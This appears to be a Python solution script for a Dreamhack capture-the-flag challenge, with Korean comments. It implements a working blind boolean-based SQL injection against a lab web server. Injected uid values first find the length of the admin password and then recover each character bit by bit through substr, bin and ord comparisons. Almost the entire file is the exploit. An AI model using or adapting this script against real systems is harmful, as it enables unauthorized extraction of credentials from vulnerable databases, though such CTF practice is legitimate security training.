# ...existing code...
import requests
import string

URL = "http://host8.dreamhack.games:21919"  # 실제 서버 주소로 변경하세요

length = 0
password = ""
# 길이 구하기
for i in range(1, 30):
    uid = f"admin' and char_length(upw)={i} -- "
    res = requests.get(f"{URL}/", params={"uid": uid})
    if "exists" in res.text:
        print(f"UID {uid} exists!")
        length = i
        break
    else:
        print(f"UID {uid} does not exist, stopping.")

# password 알아내기
for i in range(1, length + 1):
    bit_length = 0
    # 비트 길이 확인
    for j in range(1, 25):
        bit_length += 1
        uid = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length} -- "
        res = requests.get(f"{URL}/", params={"uid": uid})
        if "exists" in res.text:
            break
    print(f"{i}번째 문자 이진 길이 : {bit_length}")

    # 비트 내용 확인
    bits = ""
    for j in range(1, bit_length + 1):
        uid = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1' -- "
        res = requests.get(f"{URL}/", params={"uid": uid})
        if "exists" in res.text:
            bits += "1"
        else:
            bits += "0"
    print(f"{i}번째 비트 : {bits}")

    # 비트 처리
    padded_bin_str = bits.zfill((len(bits) + 7) // 8 * 8)
    byte_strs = [padded_bin_str[i : i + 8] for i in range(0, len(padded_bin_str), 8)]
    byte_vals = [int(b, 2) for b in byte_strs]
    byte_seq = bytes(byte_vals)
    char = byte_seq.decode("utf-8")
    password += char

    # password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")

print(password)
